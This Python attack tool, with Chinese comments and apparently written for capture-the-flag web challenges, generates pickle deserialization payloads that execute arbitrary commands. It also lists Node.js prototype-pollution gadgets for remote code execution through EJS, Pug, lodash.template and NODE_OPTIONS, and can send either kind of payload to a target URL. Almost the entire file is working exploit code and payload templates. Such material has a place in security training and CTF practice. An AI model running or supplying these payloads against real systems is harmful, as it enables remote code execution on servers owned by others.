#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用途: 双场景合一 —— 1) Python pickle 反序列化 payload 生成(命令执行/回显);
     2) Node.js 原型链污染: 常用 JSON 打点模板与 RCE gadget 速查
适用条件:
    pickle: 目站把用户可控数据交给 pickle.loads(python2 需 protocol=2)
    proto : 目站对 JSON 做 merge/deepCopy/lodash.set 等递归合并(Express/koa 常见)
用法:
    python web_pickle_pt.py pickle --cmd "cat /flag" --url http://t/api -p data --b64
    python web_pickle_pt.py proto --url http://t/merge -p body --gadget ejs
    python web_pickle_pt.py proto            # 只打印 gadget 速查
"""
import argparse
import base64
import json
import pickle
import requests


def make_pickle_payload(cmd: str, protocol: int = 2) -> bytes:
    """构造执行任意命令的 pickle: loads 时走 __reduce__ -> os.system
    protocol=2 兼容 python2 目标; 回显场景改用 (eval, ("__import__('os').popen('cmd').read()",))"""
    class RCE:
        def __reduce__(self):
            import os
            return (os.system, (cmd,))

    return pickle.dumps(RCE(), protocol=protocol)


def make_pickle_echo_payload(cmd: str, protocol: int = 2) -> bytes:
    """带回显版: popen(...).read() 的返回值会被 loads 返回给调用方(若目标回显结果)"""
    class Echo:
        def __reduce__(self):
            return (eval, (f"__import__('os').popen({cmd!r}).read()",))

    return pickle.dumps(Echo(), protocol=protocol)


def send_pickle(args, payload: bytes) -> None:
    """把 payload 以指定编码塞进参数发给目标(按题目改请求形态)"""
    data = args.raw if args.raw else base64.b64encode(payload).decode()
    if not args.url:
        print("[*] payload(b64):", base64.b64encode(payload).decode())
        return
    sess = requests.Session()
    body = {args.param: data}
    resp = (sess.post(args.url, data=body) if args.method == "post"
            else sess.get(args.url, params=body))
    print(f"[*] HTTP {resp.status_code}")
    print(resp.text[:2000])


# ---------------- Node.js 原型链污染 ----------------

# 递归 merge 打点 JSON 模板(键路径三种写法, 目标过滤 __proto__ 时换 constructor.prototype)
PROTO_TEMPLATES = [
    '{"__proto__": %s}',
    '{"constructor": {"prototype": %s}}',
    '{"__proto__": {"__proto__": %s}}',   # lodash 深层
]

# RCE gadget: 污染键 -> 生效条件
PROTO_GADGETS = {
    "child_process 环境注入": """
        污染: {"NODE_OPTIONS": "--require /proc/self/environ", "shell": "/proc/self/environ"}
        条件: 目站会 spawn 且子进程继承环境; 内容复杂时先污染 PATH 更简单""",
    "EJS 模板 RCE": """
        污染: {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');//"}
        条件: 目站用 EJS 渲染, 渲染前可污染 Object.prototype""",
    "Jade/Pug 模板 RCE": """
        污染: {"block": {"type": "Text"}, "compileDebug": "1", "self": true,
               "options": "process.mainModule.require('child_process').execSync('id')"}
        条件: Pug 编译选项走默认合并""",
    "lodash.template RCE": """
        污染: {"sourceURL": "\\nreturn process.mainModule.require('child_process').execSync('id')"}
        条件: 目站后续调用 _.template 渲染可控内容""",
    "express-fileupload 任意写": """
        直接打 CVE-2020-7699: 上传 useTempFiles 且 filename 可带路径, 写 /app/index.js
        配合原型链污染更稳: 不改本题路由时优先污染内存键""",
    "垃圾探测": """
        污染: {"a": "b"} 后请求任意接口, 若响应/行为出现全局影响(如 statusMessage 变化)即确认
        例: {"__proto__":{"statusMessage":"polluted"}} 再 curl -i 看状态行""",
}


def proto_body(gadget_json: str, style: int = 0) -> str:
    """把 gadget 的污染键值装进三种键路径模板"""
    import json
    return PROTO_TEMPLATES[style] % json.dumps(json.loads(gadget_json), separators=(",", ":"))


def cmd_proto(args):
    """原型链污染: 打印速查; 给了 url/param/gadget 就直接发"""
    if not args.url:
        for name, body in PROTO_GADGETS.items():
            print(f"=== {name} ==={body}")
        print("[*] 三种键路径模板:")
        for t in PROTO_TEMPLATES:
            print("   ", t)
        return
    # 按 gadget 生成污染键值(命令直接拼进 gadget, 双引号转义注意)
    if args.gadget == "ejs":
        gadget = {"outputFunctionName":
                  f"x;process.mainModule.require('child_process').execSync('{args.cmd}');//"}
    elif args.gadget == "node":
        gadget = {"NODE_OPTIONS": "--require /proc/self/environ",
                  "shell": "/proc/self/environ"}
    else:  # lodash
        gadget = {"sourceURL":
                  f"\\nprocess.mainModule.require('child_process').execSync('{args.cmd}')"}

    sess = requests.Session()
    for style in range(3):
        body = proto_body(json.dumps(gadget), style)
        print(f"[*] 模板{style}: {body}")
        if args.param:
            # TODO: 改这里: 按题目接口决定放 JSON body 还是表单
            resp = sess.post(args.url, json={args.param: body})
            print(f"    HTTP {resp.status_code}")
    print("[*] 污染后访问渲染/子进程接口验证效果")


def cmd_pickle(args):
    """pickle: 生成 payload 并按需发送"""
    payload = (make_pickle_echo_payload if args.echo else make_pickle_payload)(args.cmd)
    send_pickle(args, payload)


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="pickle 反序列化 + 原型链污染")
    sub = ap.add_subparsers(dest="mode", required=True)

    p = sub.add_parser("pickle", help="生成 pickle payload")
    p.add_argument("--cmd", default="cat /flag", help="要执行的命令")
    p.add_argument("--echo", action="store_true", help="带回显版本(popen.read)")
    p.add_argument("--protocol", type=int, default=2, help="pickle 协议, py2 目标用 2")
    p.add_argument("--url", help="目标 loads 点")
    p.add_argument("-p", "--param", default="data", help="参数名")
    p.add_argument("-m", "--method", choices=["get", "post"], default="post")
    p.add_argument("--raw", help="自定义编码内容(默认 base64), 如 urlencode 后的串")

    q = sub.add_parser("proto", help="原型链污染")
    q.add_argument("--url", help="merge/deepCopy 接口")
    q.add_argument("-p", "--param", help="JSON 字段名")
    q.add_argument("--gadget", choices=["ejs", "node", "lodash"], default="ejs")
    q.add_argument("--cmd", default="id", help="gadget 里执行的命令")
    args = ap.parse_args()
    (cmd_pickle if args.mode == "pickle" else cmd_proto)(args)
